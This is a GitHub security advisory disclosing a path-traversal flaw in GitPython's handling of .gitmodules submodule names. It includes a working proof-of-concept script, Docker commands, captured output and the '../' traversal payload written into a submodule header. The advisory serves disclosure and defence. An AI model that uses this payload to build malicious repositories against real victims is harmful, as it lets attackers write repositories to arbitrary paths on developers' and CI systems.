# [H] GitPython: Arbitrary Git Repository Creation Outside the Working Tree via Unvalidated .gitmodules Submodule Name in GitPython

## Summary
Severity: High
Advisory: GHSA-hmq2-w58f-27jc
CWE: CWE-22, CWE-73
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:L (CVSS_V3)
Published: 2026-08-07
Source: https://github.com/advisories/GHSA-hmq2-w58f-27jc
Type: github-advisory

## Affected
- PyPI: `GitPython` — affected >=0 <3.1.58

## Details
### Summary
GitPython computes the on-disk location of a submodule's separate Git directory (`.git/modules/<name>`) from the submodule's `.gitmodules` section name with no validation. Because that name is fully attacker-controlled content of a cloned repository, a malicious repository can set a submodule name to a traversal string (e.g. `../../../../home/victim/.something`) and cause GitPython to create and initialize a full Git repository at an attacker-chosen filesystem path outside the intended clone directory. The only precondition is that a victim clones the malicious repository with GitPython and runs submodule initialization (`submodule_update(init=True)` / `sm.update(init=True)`), a very common and often automatic step. Core Git itself already blocks this exact attack class (CVE-2018-11235), but GitPython's independent reimplementation never adopted an equivalent check.

### Details
`src/GitPython/git/objects/submodule/util.py` `sm_name()` strips the `submodule "` / `"` wrapper from a `.gitmodules` `[submodule "..."]` header and returns the result unchecked. `Submodule.iter_items()` in `src/GitPython/git/objects/submodule/base.py` reads this via `sm_name(sms)` and assigns it to `sm._name`; unlike the submodule `path`, `name` is never used for a tree lookup, so it is never implicitly validated. `Submodule._module_abspath()` then builds `osp.join(parent_repo.git_dir, "modules", name)` - `os.path.join` does not normalize `../` sequences. `Submodule._clone_repo()` passes this value straight to `os.makedirs()` and to `git clone --separate-git-dir=<module_abspath>`, creating and populating a full Git repository (objects, refs, hooks, config) at the escaped path. Attack prerequisite: attacker controls a repository the victim clones and initializes submodules for.

### PoC
1. Environment: Docker image built `FROM python:3.11-slim`, with `git` installed via `apt-get install -y git` (Debian bookworm packaged version, described in the advisory as "git 2.x"; the host-side verification separately used system git `2.34.1`, but no exact version is pinned for the git binary inside this Docker image). GitPython is installed inside the container via `pip install /src/GitPython` from this repository's own source, which the advisory states resolved to the officially released `GitPython==3.1.57` and `gitdb==4.0.12`.
2. Configuration / preconditions: None beyond what's described - the victim must clone the attacker's repository with GitPython and run submodule initialization (`repo.submodules` + `sm.update(init=True)`, equivalent to `git submodule update --init`).
3. Commands run (quoted verbatim from the advisory's "Confirmed test run" section):
```bash
$ docker build -f GHSA/testing/Dockerfile -t ghsa-gitpython-poc .
$ docker run --rm ghsa-gitpython-poc
```
(Per the Dockerfile, `docker run` executes `/work/run_all.sh`, which in turn runs `build_attacker_repo.sh`, then `poc_gitpython.py`, then `poc_control_realgit.sh`.)
4. Full source of the PoC script (`GHSA/testing/poc_gitpython.py`), verbatim:
```python
"""GHSA-001 PoC: GitPython side.

Clones the attacker repo and runs the equivalent of
`git submodule update --init` via GitPython, then checks whether a git
repository was created outside the clone directory.
"""
import os
import shutil

import git

CLONE_DIR = '/work/victim_clone/repo'
ESCAPE_TARGET = '/tmp/gitpython_poc_escaped_root'


def main():
    shutil.rmtree(os.path.dirname(CLONE_DIR), ignore_errors=True)
    shutil.rmtree(ESCAPE_TARGET, ignore_errors=True)
    os.makedirs(os.path.dirname(CLONE_DIR), exist_ok=True)

    print(f'GitPython version: {git.__version__}')
    repo = git.Repo.clone_from('/work/attacker_repo', CLONE_DIR)
    print('Cloned into:', repo.working_tree_dir)

    sms = list(repo.submodules)
    for sm in sms:
        print('  submodule name:', repr(sm.name))
        print('  submodule path:', repr(sm.path))

    print('escape_target exists before update:', os.path.exists(ESCAPE_TARGET))

    for sm in sms:
        try:
            sm.update(init=True)
        except Exception as e:
            print('sm.update raised:', repr(e))

    exists = os.path.exists(ESCAPE_TARGET)
    print('escape_target exists after update:', exists)
    if exists:
        print('escape_target contents:', os.listdir(ESCAPE_TARGET))

    print('POC_RESULT=VULNERABLE' if exists else 'POC_RESULT=SAFE')


if __name__ == '__main__':
    main()
```
5. Exact captured terminal output (verbatim, from the original advisory's "Confirmed test run (Docker, released package)" section):
```
=== GitPython PoC (vulnerable path) ===
GitPython version: 3.1.57
Cloned into: /work/victim_clone/repo
  submodule name: '../../../../../../tmp/gitpython_poc_escaped_root/modules_dir'
  submodule path: 'legit_dir'
escape_target exists before update: False
escape_target exists after update: True
escape_target contents: ['modules_dir']
POC_RESULT=VULNERABLE

=== Control: real git CLI on identical repo ===
warning: ignoring suspicious submodule name: ../../../../../../tmp/gitpython_poc_escaped_root/modules_dir
warning: ignoring suspicious submodule name: ../../../../../../tmp/gitpython_poc_escaped_root/modules_dir
fatal: No url found for submodule path 'legit_dir' in .gitmodules
CONTROL_RESULT=SAFE (real git correctly refused)
```
6. Payload: the attacker rewrites the `.gitmodules` section header from `[submodule "legit_dir"]` to `[submodule "../../../../../../tmp/gitpython_poc_escaped_root/modules_dir"]` (built by `build_attacker_repo.sh`, part of the harness in `GHSA/testing/`). The malicious part is the `../../../../../../` traversal sequence embedded in the submodule *name* (not the tree-validated `path`), which becomes the on-disk target for the submodule's separate git directory.
7. Expected vs. observed: A safe implementation (as demonstrated by the real `git` CLI control run) rejects the submodule name with "ignoring suspicious submodule name" and refuses to create anything outside the repository. GitPython instead created the escape-target directory and a fully-initialized Git repository at `/tmp/gitpython_poc_escaped_root/modules_dir`, confirmed by `escape_target exists after update: True` and its listed contents.
8. Security impact demonstrated: arbitrary filesystem directory and Git-repository creation at an attacker-chosen absolute path outside the victim's intended clone directory, populated with attacker-controlled content sourced from the submodule's own (also attacker-controlled) `url`.

### Impact
Path traversal (CWE-22) / external control of file path (CWE-73) leading to arbitrary directory and Git-repository creation outside the intended clone directory. Integrity impact is High (attacker chooses destination path and, via the submodule URL, much of the written content); Confidentiality impact is None (only creation was demonstrated); Availability impact is Low-Medium (disk-exhaustion potential). No authentication is required; the attacker only needs to control a repository the victim clones and initializes submodules for - a routine, often fully-automatic operation in CI pipelines, IDE integrations, and dependency-management tooling.

## References
- https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-hmq2-w58f-27jc
- https://github.com/gitpython-developers/GitPython/pull/2202
- https://github.com/gitpython-developers/GitPython/commit/4299c990e1ca21896f9485277caf7bb0ae5b404c
- https://github.com/gitpython-developers/GitPython/commit/e4b8e7d026ca6abb4cf604f8e77093432ce23c06
- https://github.com/gitpython-developers/GitPython
- https://github.com/gitpython-developers/GitPython/releases/tag/3.1.58
